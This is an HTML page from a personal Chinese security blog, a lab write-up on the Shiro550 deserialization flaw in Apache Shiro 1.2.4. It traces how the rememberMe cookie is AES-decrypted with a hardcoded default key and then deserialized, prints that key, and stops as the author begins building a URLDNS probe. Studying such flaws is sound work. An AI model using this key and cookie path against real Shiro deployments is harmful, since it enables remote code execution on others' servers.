@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="CTF,Java,Web,JavaScript,Linux">
+    <meta name="description" content="记录一些奇奇怪怪乱七八糟的东西">
+    <meta name="author" content="y1zh3e7">
+    
+    <title>
+        
+            Shiro550 |
+        
+        y1’s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.jpg","favicon":"/images/logo.jpg","avatar":"/images/avatar.jpg","font_size":"21px","font_family":"STHeiti","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/cover.jpg","description":"一只坐牢的web🐶 || 懂进攻知防守，先正向后逆向","font_color":"#FFFFFF","hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI","appkey":"7gIuYJ9YQk94en6wRudankYd","server_urls":"https://ycemvr5n.api.lncldglobal.com","placeholder":"Hi speak something！"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"center","copyright_info":false},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.0.0-rc1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               y1’s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Shiro550</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">y1zh3e7</span>
+                            
+                                <span class="author-label">Lv2</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-06-08 16:32:04</span>
+        <span class="mobile">2023-06-08 16:32</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-06-08 16:33:42</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/WebSec/">WebSec</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Shiro550反序列化</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.8k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>8 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h1 id="Shiro550反序列化"><a href="#Shiro550反序列化" class="headerlink" title="Shiro550反序列化"></a>Shiro550反序列化</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
+<li><p>代码准备，需要1.2.4版本的shiro代码来运行：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git</span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></tbody></table></figure></li>
+<li><p>修改maven依赖：在项目根目录的pom.xml下修改jstl依赖项为</p>
+</li>
+</ul>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><p>jdk及tomcat版本选用：</p>
+<p>jdk选用1.7：<a class="link" target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">Java Archive Downloads - Java SE 7 (oracle.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>tomcat选用8.x：<a class="link" target="_blank" rel="noopener" href="https://tomcat.apache.org/download-80.cgi">Apache Tomcat® - Apache Tomcat 8 Software Downloads<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p>idea中配置tomcat并运行shiro项目：</p>
+<p>等待maven依赖导入完成后就可以配置tomcat了，一部分maven依赖可能无法导入，但不影响项目正常启动。</p>
+<p>tomcat的配置，此外也要对项目工程及sdk和java编译版本选择为1.7，这里要将HTTP port改为其他端口，因为一会我们需要用burpsuite抓包，burpsuite默认端口也是8080，会造成端口冲突：<img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607143914577.png"></p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607143930952.png"></p>
+</li>
+<li><p>成功启动后如下：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607144051580.png"></p>
+</li>
+</ul>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607144108059.png"></p>
+<h2 id="URLDNS探测Shiro550"><a href="#URLDNS探测Shiro550" class="headerlink" title="URLDNS探测Shiro550"></a>URLDNS探测Shiro550</h2><p>我们在搭建好的网站上进行登陆，并且要勾选Rememberme后抓包，可以发现在Server端返回的Cookie中有一个rememberMe字段，并且其中看起来像是加密储存了一些内容：    <img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607164039278.png"></p>
+<p>我们可以在shiro的源码中发现实现这个功能的类<code>CookieRememberMeManager</code>，找到其中的<code>getRememberedSerializedIdentity</code>这个方法，可以看的出来这个方法会从请求中获取这个Cookie并返回，所以接下来的逻辑就是找哪个方法调用了这个方法，然后对Cookie进行解密等处理：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) {</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) {</span><br><span class="line">          <span class="keyword">if</span> (log.isDebugEnabled()) {</span><br><span class="line">              <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">"SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a "</span> +</span><br><span class="line">                      <span class="string">"servlet request and response in order to retrieve the rememberMe cookie. Returning "</span> +</span><br><span class="line">                      <span class="string">"immediately and ignoring rememberMe operation."</span>;</span><br><span class="line">              log.debug(msg);</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext) subjectContext;</span><br><span class="line">      <span class="keyword">if</span> (isIdentityRemoved(wsc)) {</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">      <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line"></span><br><span class="line">      <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> getCookie().readValue(request, response);</span><br><span class="line">      <span class="comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span></span><br><span class="line">      <span class="comment">// ignore cookies that are scheduled for removal</span></span><br><span class="line">      <span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (base64 != <span class="literal">null</span>) {</span><br><span class="line">          base64 = ensurePadding(base64);</span><br><span class="line">          <span class="keyword">if</span> (log.isTraceEnabled()) {</span><br><span class="line">              log.trace(<span class="string">"Acquired Base64 encoded identity ["</span> + base64 + <span class="string">"]"</span>);</span><br><span class="line">          }</span><br><span class="line">          <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">          <span class="keyword">if</span> (log.isTraceEnabled()) {</span><br><span class="line">              log.trace(<span class="string">"Base64 decoded byte array length: "</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">" bytes."</span>);</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">return</span> decoded;</span><br><span class="line">      } <span class="keyword">else</span> {</span><br><span class="line">          <span class="comment">//no cookie set - new site visitor?</span></span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在<code>org/apache/shiro/mgt/AbstractRememberMeManager</code>这个类中我们找到了<code>getRememberedPrincipals</code>这个方法调用了<code>getRememberedSerializedIdentity</code>，然后把这个Cookie用<code>convertBytesToPrincipals</code>进行处理，我们跟进这个方法：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> {</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">        <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">        <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) {</span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">catch</span> (RuntimeException re) {</span><br><span class="line">        principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> principals;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看到这个方法做了两件事，一个是对这个传过来的Cookie进行decrypt（解密），一个是对这个Cookie进行deserialize（反序列化），我们分别跟进这两个方法看一下：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> {</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) {</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>先来看<code>deserialize</code>：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serializedIdentity)</span> {</span><br><span class="line">    <span class="keyword">return</span> getSerializer().deserialize(serializedIdentity);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这个函数把Cookie传给了<code>getSerializer().deserialize()</code>这个方法，<code>getSerializer</code>的返回值是<code>serializer</code>，这个变量在构造函数内进行了初始化，是一个<code>DefaultSerializer</code>，因此我们跟进<code>DefaultSerializer.deserialize</code></p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> Serializer&lt;PrincipalCollection&gt; <span class="title function_">getSerializer</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> serializer;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">## 构造函数</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> {</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以发现就是实现了一个反序列化，因此确实存在反序列化漏洞的点，我们接下来就要破解上面的加密算法，从而能让我们自己的payload加密后发过去：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException {</span><br><span class="line">    <span class="keyword">if</span> (serialized == <span class="literal">null</span>) {</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">"argument cannot be null."</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    }</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">        <span class="meta">@SuppressWarnings({"unchecked"})</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> deserialized;</span><br><span class="line">    } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">"Unable to deserialze argument byte array."</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>回到decrypt上，decrypt方法先通过<code>getDecryptionCipherKey</code>方法获取了一个密钥，然后将Cookie交给<code>cipherService.decrypt</code>方法解密：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) {</span><br><span class="line">     <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">     <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">     <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) {</span><br><span class="line">         <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">         serialized = byteSource.getBytes();</span><br><span class="line">     }</span><br><span class="line">     <span class="keyword">return</span> serialized;</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看到<code>cipherService</code>是通过<code>getCipherService</code>方法得到的，跟进发现返回值在构造函数中初始化，其实到这里可以看的出来就是个Aes加密了（并且下面的setCipherKey其实就是AES的密钥，不过我们假装不知道一会再找回来），继续跟进<code>AesCipherService</code>的话可以看到Aes加密的具体方式，这里就不展示出来了：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们再回头看<code>getDecryptionCipherKey</code>方法获取密钥的逻辑，跟进：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getDecryptionCipherKey() {</span><br><span class="line">    <span class="keyword">return</span> decryptionCipherKey;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>再找<code>decryptionCipherKey</code>这个属性在哪里进行的赋值，可以发现是通过setter赋值（Find Usage -&gt; Value Write）：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDecryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] decryptionCipherKey)</span> {</span><br><span class="line">     <span class="built_in">this</span>.decryptionCipherKey = decryptionCipherKey;</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接着看哪里调用了<code>setDecryptionCipherKey</code>方法，发现在<code>setCipherKey</code>方法中：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCipherKey</span><span class="params">(<span class="type">byte</span>[] cipherKey)</span> {</span><br><span class="line">    <span class="comment">//Since this method should only be used in symmetric ciphers</span></span><br><span class="line">    <span class="comment">//(where the enc and dec keys are the same), set it on both:</span></span><br><span class="line">    setEncryptionCipherKey(cipherKey);</span><br><span class="line">    setDecryptionCipherKey(cipherKey);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最终其实还是在构造函数传了密钥，并且可以发现密钥是一个写死的常量，因此问题就出在这里，在shiro1.2.4版本下，密钥是写死的，并且采用的是AES加密（对称加密），所以我们可以通过这个密钥自己构造payload并加密后传过去进行反序列化攻击：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> {</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<p>我们看一下在这个包中的Maven依赖有哪个是我们可攻击的，发现存在commons-collections3.x，不过可以发现这个依赖项的scope是test，也就是说只有在test中运行时这个依赖才会被导入，那么真实条件下是不存在这个依赖的，所以我们是没有办法通过这个依赖进行攻击的：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607172709399.png"></p>
+<p>实际上可以攻击的依赖是commons-beanutils这个依赖，不过我们这里先用Java自带的URLDNS进行一下测试</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607172853432.png"></p>
+<hr>
+<p>将URLDNS的利用类序列化出来，我这里序列化后保存的文件名叫做ser.bin：</p>
